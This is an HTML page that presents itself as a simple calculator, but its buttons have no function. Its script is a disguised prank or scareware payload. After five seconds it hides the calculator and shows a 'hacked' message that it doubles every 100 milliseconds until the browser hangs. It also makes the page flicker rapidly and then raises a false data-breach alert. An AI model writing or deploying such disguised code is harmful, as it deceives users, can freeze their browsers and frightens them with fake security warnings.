<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Calculator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }
        #calculator {
            width: 300px;
            margin: 50px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        #display {
            width: 100%;
            font-size: 18px;
            padding: 10px;
            margin-bottom: 10px;
        }
        .btn {
            width: 30%;
            padding: 10px;
            font-size: 16px;
            margin: 5px;
            cursor: pointer;
        }
        #hacked-message {
            display: none;
            color: red;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div id="calculator">
        <input type="text" placeholder="0" id="display" readonly>
        <div>
            <button class="btn">7</button>
            <button class="btn">8</button>
            <button class="btn">9</button>
            <button class="btn">/</button>
        </div>
        <div>
            <button class="btn">4</button>
            <button class="btn">5</button>
            <button class="btn">6</button>
            <button class="btn">*</button>
        </div>
        <div>
            <button class="btn">1</button>
            <button class="btn">2</button>
            <button class="btn">3</button>
            <button class="btn">-</button>
        </div>
        <div>
            <button class="btn">0</button>
            <button class="btn">.</button>
            <button class="btn">=</button>
            <button class="btn">+</button>
        </div>
    </div>
    <div id="hacked-message">Yالله جيد وقدوس، رحيم وكريم، الحكيم والمحب</div>

    <script>
        let swap = 1, openedBefore = false;

        document.addEventListener('DOMContentLoaded', function() {
            if (openedBefore === true) {
                document.body.style.display = 'none';
            }
        });

        setTimeout(function() {
            const hackedMessage = document.getElementById('hacked-message');
            document.getElementById('calculator').style.display = 'none';
            document.body.style.backgroundColor = 'black';
            hackedMessage.style.display = 'block';

            function doubleMessage() {
                hackedMessage.innerText += hackedMessage.innerText;
                setTimeout(doubleMessage, 100);
            }

            function rapidSwap() {
                if (swap == 1) {
                    document.body.style.textAlign = 'left';
                    swap = 2;
                } else {
                    document.body.style.textAlign = 'right';
                    swap = 1;
                }
                setTimeout(rapidSwap, 20);
            }

            rapidSwap();
            doubleMessage();

            function showAlert() {
                console.log("A data breach has been detected on the current website. Urgent action is required to prevent any damages and leak of personal information such as passwords and personal information.");
                window.alert("A data breach has been detected on the current website. Urgent action is required to prevent any damages and leak of confidential data such as passwords and personal information.");
            }

            setTimeout(showAlert, 3000);

            openedBefore = true;
        }, 5000);
    </script>
</body>
</html>
